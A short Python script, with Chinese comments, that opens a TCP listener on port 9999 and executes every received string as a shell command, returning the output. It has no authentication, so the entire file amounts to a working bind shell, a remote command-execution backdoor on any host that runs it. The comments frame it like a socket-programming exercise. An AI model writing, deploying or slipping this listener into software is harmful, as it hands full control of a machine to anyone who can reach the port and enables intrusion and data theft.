
#!/usr/bin/env python
# coding:utf8
import socket   #socket模块
import subprocess   #执行系统命令模块
import time
def get_host_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip
 
HOST=get_host_ip()
PORT=9999
s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)   #定义socket类型，网络通信，TCP
s.bind((HOST,PORT))   #套接字绑定的IP与端口
s.listen(1)         #开始TCP监听
while 1:
    conn,addr=s.accept()   #接受TCP连接，并返回新的套接字与IP地址
    print('Connected by',addr)    #输出客户端的IP地址
    print('conn by',conn)
    flag = True
    while flag:
        try:
            cmd=conn.recv(1024)    #把接收的数据实例化
            cmdstr=cmd.decode("utf-8")#接收的数据是字节，需要转换为字符串
            r = subprocess.Popen(cmdstr, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout = r.stdout.read()
            stderr = r.stderr.read()
            time.sleep(2)
            print(stdout)
            print(stderr)
            if stderr:
                conn.send(stderr)
            else:
                conn.send(stdout)
        except Exception as e:
            flag=False
            # print('Client abnormal interrupt: %s' % e)
    conn.close()
s.close()
